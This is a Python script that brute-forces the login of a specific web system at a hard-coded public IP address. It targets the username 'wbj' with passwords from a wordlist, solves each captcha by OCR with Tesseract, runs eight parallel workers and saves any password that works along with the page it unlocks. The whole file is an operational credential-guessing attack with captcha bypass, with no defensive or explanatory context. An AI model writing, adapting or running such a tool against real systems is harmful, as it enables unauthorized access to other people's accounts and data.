import requests
from pytesseract import image_to_string
from PIL import Image
from urllib.parse import urlencode
from multiprocessing import Pool
import time
import io

def process_thread(passwd):
    session = requests.Session()
    try:
        response = session.get('http://222.91.162.190:81/XtLogin.aspx')
        captcha = session.get('http://222.91.162.190:81/CodeValidate.aspx?Type=Sample&Temp=636362801637913750')
    except:
        print('connection timeout current passwd: ' + passwd)
        time.sleep(60)
        process_thread(passwd)

    img = Image.open(io.BytesIO(captcha.content))
    img = img.convert('L') #转换为灰度图片
    # img.save(img_file_name)
    captcha_code = image_to_string(img)

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = {
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '',
        '__VIEWSTATEGENERATOR': '',
        'TextBox1': 'wbj',
        'TextBox2': passwd,
        'Validate1$Validate': captcha_code,
        'Button1': '登录'
    }

    result = session.post('http://222.91.162.190:81/XtLogin.aspx', data=urlencode(data), headers=headers)

    pwd_error = "<script language='javascript'>alert('请输入正确的用户名和密码');</script></form>"

    if pwd_error in result.text:
        print("pwd fail:" + passwd + ' captcha code:' + captcha_code)
        pass
    else:
        print("------------------------------------" + passwd + '-----------------------------------')
        f = open('find_password_here_congratulations', 'w')
        f.write(passwd + '\n\n')
        f.write(result.text)
        f.close()
        exit()


if __name__ == '__main__':
    start =time.time()
    password_file = open('after-4-alph-0603.list')
    # password_file.seek(50000)
    threads = Pool(8)
    line = password_file.readline()
    while line:
        passwd = line.strip('\n')
        threads.apply_async(process_thread, args=(passwd,))
        # process_thread(passwd)
        line = password_file.readline()

    threads.close()
    threads.join()
    print('All subprocesses done. use:', time.time() - start)